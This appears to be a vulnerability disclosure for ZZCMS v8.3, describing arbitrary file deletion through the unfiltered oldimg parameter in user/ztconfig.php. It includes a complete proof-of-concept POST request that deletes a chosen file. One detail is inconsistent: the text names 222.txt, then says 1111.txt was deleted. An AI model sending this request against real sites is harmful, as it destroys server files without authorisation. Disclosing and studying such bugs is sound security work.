# ZZCMS V8.3 Arbitrary file deletion vulnerability in user/ztconfig.php line 71 via the oldimg parameter
## Vulnerability CMS and version
zzcms v8.3   Download link:http://www.zzcms.net/download/zzcms8.3.zip
## Triggering conditions
Log in to access the user/ztconfig.php page
## Vulnerability details
in CMS user/ztconfig.php line 71,The CMS determines whether the oldimg parameter value exists. If it exists, then delete it and update it. Because the framework does not perform security filtering on the oldimg parameter value, any file deletion vulnerability is caused.
![](https://github.com/seedis/zzcms/blob/master/image/delete11.png)

## POC
```
POST /user/ztconfig.php?action=modify HTTP/1.1
Host: 192.168.30.216
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.30.216/user/ztconfig.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 587
Cookie: bdshare_firstime=1537240796511; PHPSESSID=gdfrssod38corqta0eho4shcs4; UserName=test; PassWord=a3f1308bd904cf33127380012be39839
Connection: close
Upgrade-Insecure-Requests: 1

swf=qipao3.swf&oldimg=/install/222.txt&img=/adfadf/adfadf&bannerheight=160&comanestyle=left&comanecolor=%23FFFFFF&daohang%5B%5D=%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5&daohang%5B%5D=%E6%8B%9B%E5%95%86%E4%BF%A1%E6%81%AF&daohang%5B%5D=%E5%93%81%E7%89%8C%E4%BF%A1%E6%81%AF&daohang%5B%5D=%E5%85%AC%E5%8F%B8%E7%AE%80%E4%BB%8B&daohang%5B%5D=%E6%8B%9B%E8%81%98%E4%BF%A1%E6%81%AF&daohang%5B%5D=%E8%B5%84%E8%B4%A8%E8%AF%81%E4%B9%A6&daohang%5B%5D=%E8%81%94%E7%B3%BB%E6%96%B9%E5%BC%8F&daohang%5B%5D=%E5%9C%A8%E7%BA%BF%E7%95%99%E8%A8%80&tongji=&baidu_map=&Submit2=+%E6%9B%B4%E6%96%B0%E8%AE%BE%E7%BD%AE+
```
Here we create the 222.txt file in the install directory for testing.Then delete the file by constructing a request,The oldimg parameter value is 222.txt 
![](https://github.com/seedis/zzcms/blob/master/image/delete22.png)

After the request is successful, you can see that the file 1111.txt we constructed was successfully deleted.
![](https://github.com/seedis/zzcms/blob/master/image/delete33.png)
